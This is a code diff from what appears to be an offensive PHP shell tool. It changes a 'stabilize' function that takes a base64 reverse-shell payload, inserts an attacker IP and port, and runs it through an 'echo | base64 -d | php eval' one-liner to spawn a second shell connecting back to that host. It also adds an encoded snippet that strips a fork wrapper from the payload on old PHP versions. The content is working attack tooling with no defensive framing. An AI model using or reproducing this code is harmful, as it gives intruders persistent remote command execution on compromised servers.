@@ -385,7 +385,11 @@ function stabilize(){
 
 				$final_payload = base64_encode(str_replace("IP_ADDR", $ip, str_replace("PORT", $recv_port, base64_decode($payload)))); // changes payload to add correct socket
 				fwrite($s, yellow("[i]")." Trying to connect to $ip:$recv_port\n".cyan("[*] ")."The present shell freezed.\nHit CTRL+C here and use the other or wait for the other to die.\n");
-				run_cmd("echo ".$final_payload."| base64 -d | php -r 'eval(file(\"php://stdin\")[0]);'"); // does the magic
+				if(phpversion()<5.4){
+					$not_compatible = base64_decode("c2hlbGxfZXhlYygiZWNobyAnaWYocGNudGxfZm9yaygpKWV4aXQoMCk7J3xwaHAgLXInZXZhbChmaWxlKFwicGhwOi8vc3RkaW5cIilbMF0pOyciKTs=");
+					$final_payload = base64_encode(str_replace($not_compatible, "", base64_decode($final_payload)));
+				}
+				run_cmd("echo ".$final_payload."| base64 -d | php -r '\$stdin=file(\"php://stdin\");eval(\$stdin[0]);'"); // does the magic
 				return;
 			}
 		}
